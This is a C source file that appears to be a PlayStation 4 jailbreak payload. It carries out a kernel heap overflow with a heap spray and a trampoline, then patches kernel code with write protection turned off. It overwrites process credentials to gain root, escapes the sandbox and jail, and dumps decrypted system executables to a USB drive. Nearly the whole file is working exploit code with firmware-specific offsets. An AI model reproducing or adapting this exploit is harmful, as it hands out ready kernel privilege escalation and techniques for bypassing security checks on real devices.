#include <ps4.h>

#define DEBUG_SOCKET

#include "defines.h"
#include "dump_utils.h"
#include "kernel_utils.h"

static int sock;
static void *dump;
int fw_version;

uint64_t xfast;
uint64_t prison0;
uint64_t rootvn;
uint64_t printf;

uint64_t secflags;
uint64_t invoke1;
uint64_t invoke2;
uint64_t hasmself;
uint64_t canmself;
uint64_t loadable;
uint64_t privchk1;
uint64_t privchk2;


/* dlclose payload funtions */

void dlclose_payload(struct knote *kn) 
{
    struct thread *td;
    struct ucred *cred;
    uint8_t *kmem;
    
    // Get td pointer
    __asm__ volatile("mov %0, %%gs:0" : "=r"(td));
    
    // Enable UART output
    uint16_t *securityflags = (uint16_t *)secflags;
    *securityflags = *securityflags & ~(1 << 15); // bootparam_disable_console_output = 0
    
    // Disable write protection
    uint64_t cr0 = readCr0();
    writeCr0(cr0 & ~X86_CR0_WP);
    
    if (fw_version == 101) {
        // Patch authMgrSmInvokeCheck on 1.01
        // error -13 (0xfffffff3) to be 0 for decrypting root selfs, may not work first time but 2nd try does it
        kmem = (uint8_t *)invoke1;
        kmem[0] = 0x00;
        kmem[1] = 0x00;
        kmem[2] = 0x00;
        kmem[3] = 0x00;
        
        kmem = (uint8_t *)invoke2;
        kmem[0] = 0x00;
        kmem[1] = 0x00;
        kmem[2] = 0x00;
        kmem[3] = 0x00;
    }
    
    // Patch sceSblACMgrHasMmapSelfCapability to return 1
    kmem = (uint8_t *)hasmself;
    kmem[0] = 0xB8;
    kmem[1] = 0x01;
    kmem[2] = 0x00;
    kmem[3] = 0x00;
    kmem[4] = 0x00;
    kmem[5] = 0xC3;
    
    // Patch sceSblACMgrIsAllowedToMmapSelf to return 1
    kmem = (uint8_t *)canmself;
    kmem[0] = 0xB8;
    kmem[1] = 0x01;
    kmem[2] = 0x00;
    kmem[3] = 0x00;
    kmem[4] = 0x00;
    kmem[5] = 0xC3;
    
    // Bypass sceSblAuthMgrIsLoadable call in vm_mmap
    kmem = (uint8_t *)loadable;
    kmem[0] = 0x31;
    kmem[1] = 0xC0;
    kmem[2] = 0x90;
    kmem[3] = 0x90;
    kmem[4] = 0x90;
    
    // Restore write protection
    writeCr0(cr0);
    
    // Resolve creds
    cred = td->td_proc->p_ucred;
    
    // Escalate process to root
    cred->cr_uid  = 0;
    cred->cr_ruid = 0;
    cred->cr_rgid = 0;
    cred->cr_groups[0] = 0;
    
    void *td_ucred = *(void **)(((char *)td) + 304); // p_ucred == td_ucred
    
    // sceSblACMgrIsSystemUcred
    uint64_t *sonyCred = (uint64_t *)(((char *)td_ucred) + 96);
    *sonyCred = 0xFFFFFFFFFFFFFFFF;
    
    // sceSblACMgrGetDeviceAccessType
    uint64_t *sceProcType = (uint64_t *)(((char *)td_ucred) + 88);
    *sceProcType = 0x3800000000000013;    // Max Access
    
    // sceSblACMgrHasSceProcessCapability
    uint64_t *sceProcCap = (uint64_t *)(((char *)td_ucred) + 104);
    *sceProcCap = 0xFFFFFFFFFFFFFFFF;     // Sce Process
    
    ((uint64_t *)privchk1)[0] = 0x123456; // priv_check_cred bypass with suser_enabled=true
    ((uint64_t *)privchk2)[0] = 0;        // bypass priv_check
    
    // Jailbreak ;)
    cred->cr_prison = (void *)prison0; // &prison0
    
    // Break out of the sandbox
    void *td_fdp = *(void **)(((char *)td->td_proc) + 72);
    uint64_t *td_fdp_fd_rdir = (uint64_t *)(((char *)td_fdp) + 24);
    uint64_t *td_fdp_fd_jdir = (uint64_t *)(((char *)td_fdp) + 32);
    uint64_t *rootvnode = (uint64_t *)rootvn;
    *td_fdp_fd_rdir = *rootvnode;
    *td_fdp_fd_jdir = *rootvnode;
}

int kernelAllocation(size_t size, int fd) 
{
    SceKernelEqueue queue = 0;
    sceKernelCreateEqueue(&queue, "kexec");
    
    sceKernelAddReadEvent(queue, fd, 0, NULL);
    
    return queue;
}

void kernelFree(int allocation)
{
    close(allocation);
}

void *exploitThread(void *none) 
{
    printfsocket("[ ] Entered exploitThread\n");
    
    uint64_t bufferSize = 0x8000;
    uint64_t overflowSize = 0x8000;
    uint64_t copySize = bufferSize + overflowSize;
    
    // Round up to nearest multiple of PAGE_SIZE
    uint64_t mappingSize = (copySize + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
    
    uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    munmap(mapping + mappingSize, PAGE_SIZE);
    
    uint8_t *buffer = mapping + mappingSize - copySize;
    
    int64_t count = (0x100000000 + bufferSize) / 4;
    
    // Create structures
    struct knote kn;
    struct filterops fo;
    struct knote **overflow = (struct knote **)(buffer + bufferSize);
    overflow[2] = &kn;
    kn.kn_fop   = &fo;
    
    // Setup trampoline to gracefully return to the calling thread
    void *trampe = NULL;
    void *trampw = NULL;
    int executableHandle;
    int writableHandle;
    
    uint8_t trampolinecode[24] = { 0x58, 0x48, 0xB8 };
    uint8_t trampolinetail[13] = { 0x50, 0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, 0xFF, 0xE0 };
    
    if (fw_version == 101) {
        uint8_t fwspecific[8] = { 0x59, 0x7D, 0x46, 0x82, 0xFF, 0xFF, 0xFF, 0xFF }; // 0xFFFFFFFF82467D59
        memcpy(trampolinecode + 3, fwspecific, 8);
    } else if (fw_version == 152) {
        uint8_t fwspecific[8] = { 0x89, 0xA8, 0x3F, 0x82, 0xFF, 0xFF, 0xFF, 0xFF }; // 0xFFFFFFFF823FA889
        memcpy(trampolinecode + 3, fwspecific, 8);
    } else {
        uint8_t fwspecific[8] = { 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF }; // 0xFFFFFFFF82403919
        memcpy(trampolinecode + 3, fwspecific, 8);
    }
    
    memcpy(trampolinecode + 11, trampolinetail, 13);
    
    // Get Jit memory
    sceKernelJitCreateSharedMemory(0, PAGE_SIZE, PROT_CPU_READ | PROT_CPU_WRITE | PROT_CPU_EXEC, &executableHandle);
    sceKernelJitCreateAliasOfSharedMemory(executableHandle, PROT_CPU_READ | PROT_CPU_WRITE, &writableHandle);
    
    // Map r+w & r+e
    trampe = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED, executableHandle, 0);
    trampw = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_TYPE, writableHandle, 0);
    
    // Copy trampoline to allocated address
    memcpy(trampw, trampolinecode, sizeof(trampolinecode));    
    *(void **)(trampw + 14) = (void *)dlclose_payload;
    
    // Call trampoline when overflown
    fo.f_detach = trampe;
    
    // Start the exploit
    int sockets[0x2000];
    int allocation[50], m = 0, m2 = 0;
    int fd = (bufferSize - 0x800) / 8;
    
    printfsocket("[ ] Creating %d sockets\n", fd);
    
    // Create sockets
    for (int i = 0; i < 0x2000; i++) {
        sockets[i] = sceNetSocket("sss", AF_INET, SOCK_STREAM, 0);
        if (sockets[i] >= fd) {
            sockets[i + 1] = -1;
            break;
        }
    }
    
    // Spray the heap
    for (int i = 0; i < 50; i++) {
        allocation[i] = kernelAllocation(bufferSize, fd);
        printfsocket("[ ] allocation = %llp\n", allocation[i]);
    }
    
    // Create hole for the system call's allocation
    m = kernelAllocation(bufferSize, fd);
    m2 = kernelAllocation(bufferSize, fd);
    kernelFree(m);
    
    // Perform the overflow
    int result = syscall(597, 1, mapping, &count);
    printfsocket("[ ] Result: %d\n", result);
    
    // Execute the payload
    printfsocket("[ ] Freeing m2\n");
    kernelFree(m2);
    
    // Close sockets
    for (int i = 0; i < 0x2000; i++) {
        if (sockets[i] == -1)
            break;
        sceNetSocketClose(sockets[i]);
    }
    
    // Free allocations
    for (int i = 0; i < 50; i++) {
        kernelFree(allocation[i]);
    }
    
    // Free the mapping
    munmap(mapping, mappingSize);
    
    return NULL;
}

int wait_for_usb(char *usb_name, char *usb_path)
{
    int fd = open("/mnt/usb0/.probe", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd != -1) {
        close(fd);
        unlink("/mnt/usb0/.probe");
        sprintf(usb_name, "%s", "USB0");
        sprintf(usb_path, "%s", "/mnt/usb0");
        return 1;
    }
    return 0;
}


/* Program Start */

int _main(struct thread *td)
{
    ScePthread thread;
    
    initKernel();    
    initLibc();
    initNetwork();
    initPthread();
    
#ifdef DEBUG_SOCKET
    struct sockaddr_in server;
    
    server.sin_len = sizeof(server);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = IP(10, 13, 37, 101);
    server.sin_port = sceNetHtons(9022);
    memset(server.sin_zero, 0, sizeof(server.sin_zero));
    sock = sceNetSocket("debug", AF_INET, SOCK_STREAM, 0);
    sceNetConnect(sock, (struct sockaddr *)&server, sizeof(server));
    
    int flag = 1;
    sceNetSetsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
    
    dump = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
#endif
    
    fw_version = kpayload_get_fw_version();
    switch (fw_version) {
    case 505:
        xfast     = KERN_505_XFAST_SYSCALL;
        prison0   = KERN_505_PRISON0;
        rootvn    = KERN_505_ROOTVNODE;
        printf    = KERN_505_PRINTF;
        hasmself  = KERN_505_PATCH_HASMSELF;
        canmself  = KERN_505_PATCH_CANMSELF;
        loadable  = KERN_505_PATCH_LOADABLE;
        break;
    case 501:
        xfast     = KERN_501_XFAST_SYSCALL;
        prison0   = KERN_501_PRISON0;
        rootvn    = KERN_501_ROOTVNODE;
        printf    = KERN_501_PRINTF;
        hasmself  = KERN_501_PATCH_HASMSELF;
        canmself  = KERN_501_PATCH_CANMSELF;
        loadable  = KERN_501_PATCH_LOADABLE;
        break;
    case 500:
        xfast     = KERN_500_XFAST_SYSCALL;
        prison0   = KERN_500_PRISON0;
        rootvn    = KERN_500_ROOTVNODE;
        printf    = KERN_500_PRINTF;
        hasmself  = KERN_500_PATCH_HASMSELF;
        canmself  = KERN_500_PATCH_CANMSELF;
        loadable  = KERN_500_PATCH_LOADABLE;
        break;
    case 474:
        xfast     = KERN_474_XFAST_SYSCALL;
        prison0   = KERN_474_PRISON0;
        rootvn    = KERN_474_ROOTVNODE;
        printf    = KERN_474_PRINTF;
        hasmself  = KERN_474_PATCH_HASMSELF;
        canmself  = KERN_474_PATCH_CANMSELF;
        loadable  = KERN_474_PATCH_LOADABLE;
        break;
    case 455:
        xfast     = KERN_455_XFAST_SYSCALL;
        prison0   = KERN_455_PRISON0;
        rootvn    = KERN_455_ROOTVNODE;
        printf    = KERN_455_PRINTF;
        hasmself  = KERN_455_PATCH_HASMSELF;
        canmself  = KERN_455_PATCH_CANMSELF;
        loadable  = KERN_455_PATCH_LOADABLE;
        break;
    case 405:
        xfast     = KERN_405_XFAST_SYSCALL;
        prison0   = KERN_405_PRISON0;
        rootvn    = KERN_405_ROOTVNODE;
        printf    = KERN_405_PRINTF;
        hasmself  = KERN_405_PATCH_HASMSELF;
        canmself  = KERN_405_PATCH_CANMSELF;
        loadable  = KERN_405_PATCH_LOADABLE;
        break;
    case 355:
        xfast     = KERN_355_XFAST_SYSCALL;
        prison0   = KERN_355_PRISON0;
        rootvn    = KERN_355_ROOTVNODE;
        printf    = KERN_355_PRINTF;
        hasmself  = KERN_355_PATCH_HASMSELF;
        canmself  = KERN_355_PATCH_CANMSELF;
        loadable  = KERN_355_PATCH_LOADABLE;
        break;
    case 350:
        xfast     = KERN_350_XFAST_SYSCALL;
        prison0   = KERN_350_PRISON0;
        rootvn    = KERN_350_ROOTVNODE;
        printf    = KERN_350_PRINTF;
        hasmself  = KERN_350_PATCH_HASMSELF;
        canmself  = KERN_350_PATCH_CANMSELF;
        loadable  = KERN_350_PATCH_LOADABLE;
        break;
    case 315:
        xfast     = KERN_315_XFAST_SYSCALL;
        prison0   = KERN_315_PRISON0;
        rootvn    = KERN_315_ROOTVNODE;
        printf    = KERN_315_PRINTF;
        hasmself  = KERN_315_PATCH_HASMSELF;
        canmself  = KERN_315_PATCH_CANMSELF;
        loadable  = KERN_315_PATCH_LOADABLE;
        break;
    case 176:
        prison0   = KERN_176_PRISON0;
        rootvn    = KERN_176_ROOTVNODE;
        printf    = KERN_176_PRINTF;
        secflags  = KERN_176_SECURITYFLAGS;
        hasmself  = KERN_176_PATCH_HASMSELF;
        canmself  = KERN_176_PATCH_CANMSELF;
        loadable  = KERN_176_PATCH_LOADABLE;
        privchk1  = KERN_176_PRIVCHECKPASS1;
        privchk2  = KERN_176_PRIVCHECKPASS2;
        break;
    case 152:
        prison0   = KERN_152_PRISON0;
        rootvn    = KERN_152_ROOTVNODE;
        printf    = KERN_152_PRINTF;
        secflags  = KERN_152_SECURITYFLAGS;
        hasmself  = KERN_152_PATCH_HASMSELF;
        canmself  = KERN_152_PATCH_CANMSELF;
        loadable  = KERN_152_PATCH_LOADABLE;
        privchk1  = KERN_152_PRIVCHECKPASS1;
        privchk2  = KERN_152_PRIVCHECKPASS2;
        break;        
    case 101:
        prison0   = KERN_101_PRISON0;
        rootvn    = KERN_101_ROOTVNODE;
        printf    = KERN_101_PRINTF;
        secflags  = KERN_101_SECURITYFLAGS;
        invoke1   = KERN_101_PATCH_INVOKE1;
        invoke2   = KERN_101_PATCH_INVOKE2;
        hasmself  = KERN_101_PATCH_HASMSELF;
        canmself  = KERN_101_PATCH_CANMSELF;
        loadable  = KERN_101_PATCH_LOADABLE;
        privchk1  = KERN_101_PRIVCHECKPASS1;
        privchk2  = KERN_101_PRIVCHECKPASS2;
        break;
    default:
        printfsocket("[ ] Firmware %d is not supported!\n", fw_version);
        return -1;
    }
    
    printfsocket("[ ] Firmware: %d\n", fw_version);
    
    if (fw_version < 315) {
        initJIT();
        
        //int (*printfkernel)(const char *fmt, ...) = (void *)printf;
        
        printfsocket("[ ] Starting...\n");
        printfsocket("[ ] UID = %d\n", getuid());
        printfsocket("[ ] GID = %d\n", getgid());
        
        if (getuid() != 0)
        {
            // Create exploit thread
            if (scePthreadCreate(&thread, NULL, exploitThread, NULL, "exploitThread") != 0)
            {
                printfsocket("[-] pthread_create error\n");
                return 0;
            }
            
            // Wait for thread to exit
            scePthreadJoin(thread, NULL);
            
            // At this point we should have root and jailbreak
            if (getuid() != 0)
            {
                printfsocket("[-] Error: Kernel patch failed!\n");
                sceNetSocketClose(sock);
                return 1;
            }
            
            printfsocket("[ ] Kernel patch success!\n");
        }
    } else {
        printfsocket("[ ] Jailbreaking\n");
        
        // Patch some things in the kernel (sandbox, prison) to give userland more privileges...
        jailbreak(xfast, prison0, rootvn, hasmself, canmself, loadable);
        
        // hook our kernel print function
        //void* kernel_base = &((uint8_t*)__readmsr(0xC0000082))[-xfast];
        //int (*printfkernel)(const char *fmt, ...) = (void *)(kernel_base + printf);
    }
    
    // DuMp Em AlL! */
    char usb_name[64];
    char usb_path[64];
    char root_dir[64];
    
    // Get your USB drive ready
    if (!wait_for_usb(usb_name, usb_path)) {
        do {
            sceKernelSleep(1);
        }
        while (!wait_for_usb(usb_name, usb_path));
    }
    
    // Make our versioned USB directory
    sprintf(root_dir, "%s/%d", usb_path, fw_version);
    printfsocket("[ ] Path: %s\n", root_dir);
    mkdir(root_dir, 0644);
    
    traverse_dir("/", root_dir, decrypt_self_to_elf);
    
#ifdef DEBUG_SOCKET
    munmap(dump, PAGE_SIZE);
#endif
    
    sceNetSocketClose(sock);
    
    return 0;
}